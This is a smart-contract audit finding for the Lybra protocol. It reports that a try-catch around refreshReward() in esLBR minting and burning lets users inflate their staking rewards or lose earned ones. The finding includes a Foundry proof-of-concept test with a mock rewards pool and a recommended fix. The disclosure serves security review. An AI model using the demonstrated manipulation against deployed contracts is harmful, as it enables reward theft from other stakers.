## Tags

- bug
- 2 (Med Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- M-06

# [Allowing `refreshReward()` to fail during minting or buring esLBR could result in gain or loss previously earned reward](https://github.com/code-423n4/2023-06-lybra-findings/issues/794) 

# Lines of code

https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/token/esLBR.sol#L33
https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/token/esLBR.sol#L40


# Vulnerability details

## Impact
The `esLBR` balance of users plays the most important role in staking reward calculation. Using a try-catch statement over `refreshReward()` in the `esLBR.mint()` and `esLBR.burn()` functions can have the following effects when `refreshReward()` become unavailable:
* Users can mint more `esLBR`, then manually call `refreshReward()` afterward for the contract to record the earned reward with the increased `esLBR` balance of the users. This results in users receiving more rewards than they should.
* Users can be back run by a searcher or someone else calling `refreshReward(victim)` for the contract to record the earned reward with the decreased `esLBR` balance of the users. This results in users losing some of their rightful pending rewards that have not yet been recorded to the latest timestamp.

## Proof of Concept
The following is the coded PoC using [Foundry](https://github.com/foundry-rs/foundry).

**Note:** This PoC creates a mock reward contract. It has the same logic as the real one, but with added setter functions that serve only to simplify the test flow.
```solidity
File: test/esLBR.t.sol

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "contract/lybra/configuration/LybraConfigurator.sol";
import "contract/lybra/governance/GovernanceTimelock.sol";
import {esLBR} from "contract/lybra/token/esLBR.sol";

contract C4esLBRTest is Test {
    Configurator configurator;
    GovernanceTimelock govTimelock;
    mockProtocolRewardsPool rewardsPool;
    esLBR eslbr;

    address exploiter = address(0xfff);
    address victim = address(0xeee);

    function setUp() public {
        govTimelock = new GovernanceTimelock(0, new address[](0), new address[](0), address(0));
        configurator = new Configurator(address(govTimelock), address(0));
        rewardsPool = new mockProtocolRewardsPool();
        eslbr = new esLBR(address(configurator));

        rewardsPool.setTokenAddress(address(eslbr));

        address[] memory minter = new address[](1);
        minter[0] = address(this);
        bool[] memory minterBool = new bool[](1);
        minterBool[0] = true;
        configurator.setTokenMiner(minter, minterBool); // set this contract as the esLBR minter
        configurator.setProtocolRewardsPool(address(rewardsPool));

        eslbr.mint(exploiter, 100 ether);
        eslbr.mint(victim, 100 ether);
        rewardsPool.setRewardPerTokenStored(1);
    }

    function testMintFailRefreshReward() public {
        assertEq(eslbr.balanceOf(exploiter), eslbr.balanceOf(victim), "Should start with equal esLBR balance");
        assertEq(rewardsPool.earned(exploiter), rewardsPool.earned(victim), "Should start with equal rewards accrued");

        rewardsPool.setRewardPerTokenStored(2);

        eslbr.mint(victim, 100 ether); // refreshReward should pass
        rewardsPool.forceRevert(true); // Assume something occur, causing the refreshReward become unavailable
        eslbr.mint(exploiter, 100 ether);

        // Record earning rewards to latest rate
        rewardsPool.forceRevert(false);
        rewardsPool.refreshReward(exploiter);
        rewardsPool.refreshReward(victim);

        assertGt(rewardsPool.earned(exploiter), rewardsPool.earned(victim), "Exploiter should have more reward by this flaw");
    }

    function testBurnFailRefreshReward() public {
        assertEq(eslbr.balanceOf(exploiter), eslbr.balanceOf(victim), "Should start with equal esLBR balance");
        assertEq(rewardsPool.earned(exploiter), rewardsPool.earned(victim), "Should start with equal rewards accrued");

        rewardsPool.forceRevert(true); // Assume something occur, causing the refreshReward become unavailable
        eslbr.burn(victim, 100 ether); // The victim unstake during that time

        // Record earning rewards to latest rate
        rewardsPool.forceRevert(false);
        rewardsPool.refreshReward(exploiter);
        rewardsPool.refreshReward(victim);

        assertGt(rewardsPool.earned(exploiter), rewardsPool.earned(victim), "Victim should loss earned rewards by this flaw");
    }
}

contract mockProtocolRewardsPool {
    esLBR public eslbr;

    // Sum of (reward ratio * dt * 1e18 / total supply)
    uint public rewardPerTokenStored;
    // User address => rewardPerTokenStored
    mapping(address => uint) public userRewardPerTokenPaid;
    // User address => rewards to be claimed
    mapping(address => uint) public rewards;

    bool isForceRevert; // for mockup reverting on refreshreward

    function setTokenAddress(address _eslbr) external {
        eslbr = esLBR(_eslbr);
    }

    // User address => esLBR balance
    function stakedOf(address staker) internal view returns (uint256) {
        return eslbr.balanceOf(staker);
    }

    function earned(address _account) public view returns (uint) {
        return ((stakedOf(_account) * (rewardPerTokenStored - userRewardPerTokenPaid[_account])) / 1e18) + rewards[_account];
    }

    /**
     * @dev Call this function when deposit or withdraw ETH on Lybra and update the status of corresponding user.
     */
    modifier updateReward(address account) {
        if (isForceRevert) revert();
        rewards[account] = earned(account);
        userRewardPerTokenPaid[account] = rewardPerTokenStored;
        _;
    }

    function refreshReward(address _account) external updateReward(_account) {}

    function forceRevert(bool _isForce) external {
        isForceRevert = _isForce;
    }

    function setRewardPerTokenStored(uint value) external {
        rewardPerTokenStored = value;
    }
}
```

The test should pass without errors.
```shell
Running 2 tests for test/esLBR.t.sol:C4esLBRTest
[PASS] testBurnFailRefreshReward() (gas: 141678)
[PASS] testMintFailRefreshReward() (gas: 188308)
Test result: ok. 2 passed; 0 failed; finished in 2.50ms
```

Please follow this [gist](https://gist.github.com/t-nero/e97d8b9c7c5067b1638fe2b929b45456) if you prefer my instruction on how I setup the contest repo with Foundry environment.

## Tools Used
* Manual review
* Foundry

## Recommended Mitigation Steps
The `refreshReward()` function should be a mandatory action inside either the `mint()` or `burn()` functions. The try-catch statement should be removed.


## Assessed type

Other